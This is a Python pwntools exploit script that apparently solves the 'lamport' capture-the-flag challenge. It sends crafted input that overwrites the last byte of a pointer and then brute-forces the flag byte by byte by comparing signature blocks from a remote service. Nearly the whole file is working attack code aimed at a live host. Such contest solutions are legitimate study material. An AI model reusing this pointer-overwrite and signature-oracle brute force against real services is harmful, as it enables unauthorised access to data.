from pwn import *
import time
'''
data layout: Idea is to overlay the last byte of &004080b0 change to DAT_00408090
so we can brute byte by byte to compare the signuture and output the flag.
construct flag len("flag...")= 31 + chr(192) + chr(0x90)
        DAT_004080b0 = &DAT_00408070;
        DAT_004080b8 = &DAT_00408090;
        DAT_004080c0 = &DAT_00404070;
In [178]: for i in range(0,256):
     ...:     if i&0xe0==224:
     ...:         print(i,end=",")
     ...:
     ...:
224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,
In [179]: for i in range(0,256):
     ...:     if i&0xf0==240:
     ...:         print(i,end=",")
     ...:
     ...:
     ...:
240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,
In [180]: for i in range(0,256):
     ...:     if i&0xc0==192:
     ...:         print(i,end=",")
     ...:
     ...:
     ...:
192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,
'''
io = remote("lamport.forfuture.fluxfingers.net", 1337)
io.sendline(chr(255))
data = io.recvuntil("The message is ")
loop = 512
constant = data.split("[+] Signature:\n")[1].replace("\n","")
io.close()
flag = [32]*31
for i in range(0,32):
    for j in range(32,127):
        io = remote("lamport.forfuture.fluxfingers.net", 1337)
        guess = "".join([chr(z) for z in flag]) + chr(192) + chr(0x90)
        io.sendline(guess)
        time.sleep(1)
        data = io.recvuntil("The message is ")
        sign = data.split("[+] Signature:\n")[1].replace("\n","")
        io.close()
        for k in range(0,31):
            if sign[512*k:512*(k+1)] != constant[512*k:512*(k+1)]:
                flag[k]=flag[k]+1
        print guess
